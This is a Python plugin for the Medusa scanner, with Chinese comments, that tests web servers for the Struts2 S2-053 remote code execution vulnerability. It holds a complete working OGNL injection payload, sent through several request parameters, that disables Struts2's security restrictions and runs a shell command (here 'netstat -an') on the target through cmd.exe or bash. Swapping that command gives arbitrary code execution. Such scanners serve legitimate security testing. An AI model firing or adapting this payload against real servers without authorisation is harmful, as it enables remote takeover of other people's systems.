#!/usr/bin/env python
# -*- coding: utf-8 -*-
from Modules.Struts2.CriticalResult import Result
import requests
from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,ErrorHandling,Proxies
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-3-14"  # 插件编辑时间
        self.info['disclosure']='2020-3-11'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Struts2RemoteCodeExecutionVulnerability53"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞53' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "0"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果


def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=Proxies().result(proxies)
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    m = [
        "id",
        "name",
        "filename",
        "username",
        "password",
    ]
    for i in m :
        try:

            payload_url = scheme + "://" + url +":"+ str(port)+"/index.action?" + i + "=" + "'''%25%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27netstat%20-an%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23process.getInputStream%28%29%29%29%7D'''"
            headers = {
                'User-Agent': RandomAgent,
                "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
                "Content-Type": "application/x-www-form-urlencoded"
            }

            resp = requests.get(payload_url,headers=headers, timeout=6, proxies=proxies,verify=False)
            con = resp.text
            resilt = Result(con)
            if resilt == "Linux" or resilt == "NoteOS" or resilt == "Windows":
                Medusa = "{} 存在Struts2远程代码执行漏洞\r\n漏洞详情:\r\n版本号:S2-53\r\n返回数据:{}\r\n".format(url, con, resilt)
                _t=VulnerabilityInfo(Medusa)
                VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
                WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
        except Exception as e:
            _ = VulnerabilityInfo('').info.get('algroup')
            ErrorHandling().Outlier(e, _)
            _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类
